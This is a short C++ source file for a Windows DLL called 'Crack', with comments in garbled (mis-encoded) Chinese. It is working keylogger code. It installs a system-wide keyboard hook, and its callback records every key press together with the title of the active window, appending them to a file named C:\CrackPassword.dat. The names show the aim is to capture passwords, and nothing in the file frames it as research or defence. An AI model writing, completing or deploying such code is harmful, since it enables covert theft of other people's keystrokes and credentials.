// Crack.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "pch.h"

//��װ����
BOOL InstallHook() {
	//��װ����
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"Crack"), 0);

	if (g_hHook == NULL)
		return false;

	return true;
}

//ж�ع���
BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_hHook);
}

//���Ӵ�����
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	char szText[MAX_PATH];
	//����
	char szKey[100];
	HWND hWnd = GetActiveWindow();
	if (hWnd == NULL) {
		hWnd = GetForegroundWindow();
	}

	if (hWnd == NULL) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	//��ȡ���ڱ���
	char szTitleText[MAX_PATH];
	GetWindowTextA(hWnd, szTitleText, MAX_PATH);

	FILE* pFile = fopen("C:\\CrackPassword.dat", "a+");

	//FILE* pFile;
	//errno_t err;
	//err = fopen_s(&pFile, "F:\\Desktop\\CrackPassword.dat", "a+");

	//�ļ���ʧ��
	if (pFile == NULL) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	if (nCode < 0 || nCode == HC_NOREMOVE) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	if (lParam & 0x40000000) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	//��ȡ��������
	GetKeyNameTextA(lParam, szKey, 100);

	sprintf(szText, "%s:%s\r\n", szTitleText, szKey);

	//д���ļ�
	fwrite(szText, strlen(szText), 1, pFile);
	//fwrite(szKey, strlen(szKey), 1, pFile);

	//fputs("\r\n", pFile);

	fclose(pFile);

	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}